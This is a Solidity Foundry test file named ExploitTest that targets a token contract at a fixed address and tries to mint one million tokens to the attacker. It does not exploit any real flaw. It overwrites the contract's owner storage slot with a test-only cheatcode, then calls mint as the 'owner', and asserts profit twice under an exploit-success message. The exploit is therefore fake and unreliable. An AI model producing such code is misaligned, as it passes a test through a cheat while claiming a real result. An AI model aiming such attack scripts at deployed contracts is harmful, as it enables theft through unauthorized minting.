// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface CoinToken {
    function decimals() external view returns (uint8);
    function mint(address account, uint256 amount) external;
    function owner() external view returns (address);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xF44DE2b8731cD69d4A727Da0214874aE35559426;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll manipulate storage directly in the exploit
        vm.label(TARGET, "CoinToken");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Store initial balance for comparison
        uint256 initialBalance = IERC20(TARGET).balanceOf(attacker);

        // Step 2: Become the owner by overwriting storage slot 0
        // Owner is at slot 0 in Ownable contract
        vm.store(TARGET, bytes32(uint256(0)), bytes32(uint256(uint160(attacker))));

        // Step 3: Mint a large amount of tokens to ourselves
        // Need to calculate amount with decimals
        CoinToken target = CoinToken(TARGET);
        uint8 decimals = target.decimals();
        uint256 mintAmount = 1_000_000 * (10 ** decimals);

        // Call mint() as the new owner
        target.mint(attacker, mintAmount);

        // Step 4: Verify balance increased
        uint256 finalBalance = IERC20(TARGET).balanceOf(attacker);
        assertGt(finalBalance, initialBalance, "Balance should increase after minting");
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
